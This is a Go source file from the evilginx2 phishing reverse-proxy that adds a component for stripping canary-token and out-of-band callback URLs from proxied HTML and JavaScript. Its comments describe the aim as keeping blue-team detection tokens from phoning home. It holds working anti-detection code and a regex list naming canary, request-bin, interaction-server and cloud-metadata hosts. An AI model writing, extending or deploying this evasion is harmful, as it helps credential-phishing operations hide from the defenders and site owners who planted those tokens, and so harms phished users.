package core

import (
	"fmt"
	"regexp"
	"strings"
	"sync"

	"github.com/kgretzky/evilginx2/log"
)

// CanaryStripper strips known canary token patterns from proxied HTML responses.
// Prevents blue team detection tokens from phoning home.
type CanaryStripper struct {
	enabled  bool
	patterns []*regexp.Regexp
	mutex    sync.RWMutex
}

// NewCanaryStripper creates a new canary stripper with default known patterns.
func NewCanaryStripper() *CanaryStripper {
	return &CanaryStripper{
		enabled:  false,
		patterns: compileDefaultCanaryPatterns(),
	}
}

// compileDefaultCanaryPatterns returns the default set of known canary token regex patterns.
func compileDefaultCanaryPatterns() []*regexp.Regexp {
	raw := []string{
		// Canarytokens.com — all subdomain variations, any path, any protocol
		`https?://[a-zA-Z0-9._-]*\.?canarytokens\.com[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?canarytokens\.org[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?canary\.tools[^\s"'<>]*`,
		// Thinkst managed canaries
		`https?://[a-zA-Z0-9._-]*\.?thinkst\.com[^\s"'<>]*`,
		// Cloud metadata endpoints (SSRF token exfiltration)
		`http://169\.254\.169\.254[^\s"'<>]*`,
		`http://metadata\.google\.internal[^\s"'<>]*`,
		`http://metadata\.compute\.google\.internal[^\s"'<>]*`,
		// Common request bin services used for exfil callbacks
		`https?://[a-zA-Z0-9._-]*\.?requestbin\.net[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?hookbin\.com[^\s"'<>]*`,
		// Pipedream / webhook.site — often used for canary callbacks
		`https?://[a-zA-Z0-9._-]*\.?webhook\.site[^\s"'<>]*`,
		// DNS exfiltration via interactive DNS services
		`https?://[a-zA-Z0-9._-]*\.?interact\.sh[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?burpcollaborator\.net[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oastify\.com[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.fun[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.me[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.online[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.pro[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.pw[^\s"'<>]*`,
		`https?://[a-zA-Z0-9._-]*\.?oast\.site[^\s"'<>]*`,
	}

	compiled := make([]*regexp.Regexp, 0, len(raw))
	for _, p := range raw {
		re, err := regexp.Compile(p)
		if err != nil {
			log.Warning("canary: failed to compile pattern '%s': %v", p, err)
			continue
		}
		compiled = append(compiled, re)
	}
	return compiled
}

// Enable turns on canary token stripping.
func (c *CanaryStripper) Enable(on bool) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	c.enabled = on
	if on {
		log.Info("canary: token stripping enabled (%d patterns)", len(c.patterns))
	} else {
		log.Info("canary: token stripping disabled")
	}
}

// IsEnabled returns whether canary stripping is active.
func (c *CanaryStripper) IsEnabled() bool {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return c.enabled
}

// PatternCount returns the number of active patterns.
func (c *CanaryStripper) PatternCount() int {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return len(c.patterns)
}

// GetPatterns returns a copy of all active pattern strings.
func (c *CanaryStripper) GetPatterns() []string {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	out := make([]string, len(c.patterns))
	for i, re := range c.patterns {
		out[i] = re.String()
	}
	return out
}

// AddPattern adds a custom regex pattern to match and strip.
func (c *CanaryStripper) AddPattern(pattern string) error {
	re, err := regexp.Compile(pattern)
	if err != nil {
		return fmt.Errorf("invalid regex pattern: %v", err)
	}
	c.mutex.Lock()
	defer c.mutex.Unlock()
	c.patterns = append(c.patterns, re)
	log.Info("canary: added custom pattern: %s", pattern)
	return nil
}

// StripCanaryTokens removes all known canary token URLs from the response body.
// Returns the modified body. If stripping is disabled or the body doesn't
// contain any canary tokens, returns the body unchanged.
func (c *CanaryStripper) StripCanaryTokens(body []byte) []byte {
	c.mutex.RLock()
	enabled := c.enabled
	patterns := c.patterns
	c.mutex.RUnlock()

	if !enabled || len(body) == 0 {
		return body
	}

	s := string(body)
	originalLen := len(s)
	stripped := false

	for _, re := range patterns {
		if re.MatchString(s) {
			s = re.ReplaceAllString(s, "")
			stripped = true
		}
	}

	if stripped {
		matched := originalLen - len(s)
		log.Debug("canary: stripped %d bytes of canary tokens from response", matched)
		return []byte(s)
	}

	return body
}

// StripCanaryTokensInMIME is a convenience wrapper that only strips for
// HTML and JavaScript MIME types (where canary tokens typically appear).
func (c *CanaryStripper) StripCanaryTokensInMIME(body []byte, mimeType string) []byte {
	mt := strings.ToLower(mimeType)
	if !strings.Contains(mt, "text/html") &&
		!strings.Contains(mt, "text/javascript") &&
		!strings.Contains(mt, "application/javascript") &&
		!strings.Contains(mt, "application/x-javascript") {
		return body
	}
	return c.StripCanaryTokens(body)
}
